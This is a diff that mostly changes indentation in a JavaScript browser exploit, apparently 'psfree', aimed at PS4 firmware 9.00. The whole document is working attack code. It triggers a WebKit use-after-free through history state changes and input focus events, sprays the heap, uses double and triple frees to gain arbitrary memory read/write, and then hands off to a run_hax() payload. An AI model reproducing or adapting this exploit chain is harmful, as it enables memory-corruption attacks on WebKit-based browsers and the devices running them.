@@ -1,48 +1,48 @@
-const ps4_9_00 = 2;
-const target = ps4_9_00;
-const ssv_len = 0x50;
-const num_reuse = 0x400;
-const js_butterfly = 0x8;
-const view_m_vector = 0x10;
-const view_m_length = 0x18;
-const view_m_mode = 0x1c;
-const size_view = 0x20;
-const strimpl_strlen = 4;
-const strimpl_m_data = 8;
-const strimpl_inline_str = 0x14;
-const size_strimpl = 0x18;
-const original_strlen = ssv_len - size_strimpl;
-const buffer_len = 0x20;
-const num_str = 0x400;
-const num_gc = 30;
-const num_space = 19;
-const original_loc = window.location.pathname;
-const loc = original_loc + '#foo';
-let rstr = null;
-let view_leak_arr = [];
-let jsview = [];
-let s1 = { views: [] };
-let view_leak = null;
-let input = document.body.appendChild(document.createElement("input"));
-input.style.position = "absolute";
-input.style.top = "-100px";
-let foo = document.body.appendChild(document.createElement("a"));
-foo.id = "foo";
-let pressure = null;
-function gc(num_loop) {
-    pressure = Array(100);
-    for (let i = 0; i < num_loop; i++) {
-        for (let i = 0; i < pressure.length; i++) {
-            pressure[i] = new Uint32Array(0x40000);
-        }
-        pressure = Array(100);
-    }
-    pressure = null;
-}
-function sleep(ms) {
+ const ps4_9_00 = 2;
+ const target = ps4_9_00;
+ const ssv_len = 0x50;
+ const num_reuse = 0x400;
+ const js_butterfly = 0x8;
+ const view_m_vector = 0x10;
+ const view_m_length = 0x18;
+ const view_m_mode = 0x1c;
+ const size_view = 0x20;
+ const strimpl_strlen = 4;
+ const strimpl_m_data = 8;
+ const strimpl_inline_str = 0x14;
+ const size_strimpl = 0x18;
+ const original_strlen = ssv_len - size_strimpl;
+ const buffer_len = 0x20;
+ const num_str = 0x400;
+ const num_gc = 30;
+ const num_space = 19;
+ const original_loc = window.location.pathname;
+ const loc = original_loc + '#foo';
+ let rstr = null;
+ let view_leak_arr = [];
+ let jsview = [];
+ let s1 = {views : []};
+ let view_leak = null;
+ let input = document.body.appendChild(document.createElement("input"));
+ input.style.position = "absolute";
+ input.style.top = "-100px";
+ let foo = document.body.appendChild(document.createElement("a"));
+ foo.id = "foo";
+ let pressure = null;
+ function gc(num_loop) {
+   pressure = Array(100);
+   for (let i = 0; i < num_loop; i++) {
+       for (let i = 0; i < pressure.length; i++) {
+           pressure[i] = new Uint32Array(0x40000);
+       }
+       pressure = Array(100);
+   }
+   pressure = null;
+ }
+ function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
-}
-function prepare_uaf() {
+ }
+ function prepare_uaf() {
     history.pushState('state0', '');
     for (let i = 0; i < num_space; i++) {
         history.replaceState('state0', '');
@@ -52,8 +52,8 @@ function prepare_uaf() {
     for (let i = 0; i < num_space; i++) {
         history.replaceState("state2", "");
     }
-}
-function free(save) {
+ }
+ function free(save) {
     history.replaceState('state3', '', original_loc);
     for (let i = 0; i < num_reuse; i++) {
         let view = new Uint8Array(new ArrayBuffer(ssv_len));
@@ -62,8 +62,8 @@ function free(save) {
         }
         save.views.push(view);
     }
-}
-function check_spray(views) {
+ }
+ function check_spray(views) {
     if (views.length !== num_reuse) {
         showMessage(`views.length: ${views.length}`);
         die('views.length !== num_reuse, restart the entire exploit');
@@ -74,8 +74,8 @@ function check_spray(views) {
         }
     }
     return null;
-}
-async function use_after_free(pop_func, save) {
+ }
+ async function use_after_free(pop_func, save) {
     const pop_promise = new Promise((resolve, reject) => {
         function pop_wrapper(event) {
             try {
@@ -85,12 +85,12 @@ async function use_after_free(pop_func, save) {
             }
             resolve();
         }
-        addEventListener("popstate", pop_wrapper, { once: true });
+        addEventListener("popstate", pop_wrapper, {once:true});
     });
     prepare_uaf();
     let num_free = 0;
     function onblur() {
-        if (num_free > 0) {
+        if (num_free > 0)  {
             die('multiple free()s, restart the entire exploit');
         }
         free(save);
@@ -98,13 +98,13 @@ async function use_after_free(pop_func, save) {
     }
     input.onblur = onblur;
     await new Promise((resolve) => {
-        input.addEventListener('focus', resolve, { once: true });
+        input.addEventListener('focus', resolve, {once:true});
         input.focus();
     });
     history.back();
     await pop_promise;
-}
-async function setup_ar(save) {
+ }
+ async function setup_ar(save) {
     const view = save.ab;
     view[0] = 1;
     for (let i = 1; i < view.length; i++) {
@@ -152,8 +152,8 @@ async function setup_ar(save) {
         }
         return;
     }
-}
-async function double_free(save) {
+ }
+ async function double_free(save) {
     const view = save.ab;
     await setup_ar(save);
     let buffer = new ArrayBuffer(buffer_len);
@@ -213,12 +213,12 @@ async function double_free(save) {
     let rstr_addr = read64(view, strimpl_m_data);
     write64(view, strimpl_m_data, view_leak);
     for (let i = 0; i < 4; i++) {
-        jsview.push(sread64(rstr, i * 8));
+        jsview.push(sread64(rstr, i*8));
     }
     write64(view, strimpl_m_data, rstr_addr);
     write32(view, strimpl_strlen, original_strlen);
-}
-function find_leaked_view(rstr, view_rstr, view_m_vector, view_arr) {
+ }
+ function find_leaked_view(rstr, view_rstr, view_m_vector, view_arr) {
     const old_m_data = read64(view_rstr, strimpl_m_data);
     let res = null;
     write64(view_rstr, strimpl_m_data, view_m_vector);
@@ -235,8 +235,8 @@ function find_leaked_view(rstr, view_rstr, view_m_vector, view_arr) {
         die('not found');
     }
     return res;
-}
-class Reader {
+ }
+ class Reader {
     constructor(rstr, view_rstr, leaker, leaker_addr) {
         this.rstr = rstr;
         this.view_rstr = view_rstr;
@@ -268,8 +268,8 @@ class Reader {
         write64(this.view_rstr, strimpl_m_data, this.old_m_data);
         return res;
     }
-}
-function setup_ssv_data(reader) {
+ }
+ function setup_ssv_data(reader) {
     const r = reader;
     const size_vector = 0x10;
     const size_abc = target === ps4_9_00 ? 0x18 : 0x20;
@@ -304,16 +304,16 @@ function setup_ssv_data(reader) {
     }
     return {
         m_data,
-        m_arrayBufferContentsArray: r.get_view_vector(abc_vector),
+        m_arrayBufferContentsArray : r.get_view_vector(abc_vector),
         worker,
-        nogc: [
+        nogc : [
             data,
             abc_vector,
             abc,
         ],
-    };
-}
-async function setup_arw(save, ssv_data) {
+     };
+ }
+ async function setup_arw(save, ssv_data) {
     const num_msg = 1000;
     const view = save.ab;
     let msgs = [];
@@ -339,7 +339,7 @@ async function setup_arw(save, ssv_data) {
     for (let i = 0; i < view.length; i++) {
         copy.push(view[i]);
     }
-    const { m_data, m_arrayBufferContentsArray, worker, nogc } = ssv_data;
+    const {m_data, m_arrayBufferContentsArray, worker, nogc} = ssv_data;
     write64(view, 8, read64(m_data, 0));
     write64(view, 0x10, read64(m_data, 8));
     write64(view, 0x18, m_arrayBufferContentsArray);
@@ -357,20 +357,20 @@ async function setup_arw(save, ssv_data) {
         }
     }
     die('no arbitrary r/w');
-}
-async function triple_free(
+ }
+ async function triple_free(
     save,
     jsview,
     view_leak_arr,
     leaked_view_addr,
-) {
+ ) {
     const leaker = find_leaked_view(rstr, save.ab, jsview[2], view_leak_arr);
     let r = new Reader(rstr, save.ab, leaker, leaked_view_addr);
     const ssv_data = setup_ssv_data(r);
     r = null;
     await setup_arw(save, ssv_data);
-}
-function pop(event, save) {
+ }
+ function pop(event, save) {
     let spray_res = check_spray(save.views);
     if (spray_res === null) {
         die('failed spray');
@@ -378,8 +378,8 @@ function pop(event, save) {
         save.pop = event;
         save.ab = save.views[spray_res];
     }
-}
-async function get_ready() {
+ }
+ async function get_ready() {
     await new Promise((resolve, reject) => {
         if (document.readyState !== "complete") {
             document.addEventListener("DOMContentLoaded", resolve);
@@ -387,8 +387,8 @@ async function get_ready() {
         }
         resolve();
     });
-}
-async function run_psfree() {
+ }
+    async function run_psfree(){
     document.getElementById("run-jb-parent").style.opacity = "0";
     document.getElementById("console-parent").style.opacity = "1";
     debug_log("[+] running psfree for userland exploit...");
@@ -448,6 +448,6 @@ async function run_psfree() {
             return new int64(res.low(), res.high());
         }
     };
-    window.p = prim;
-    run_hax();
+ window.p = prim;
+ run_hax();
 }
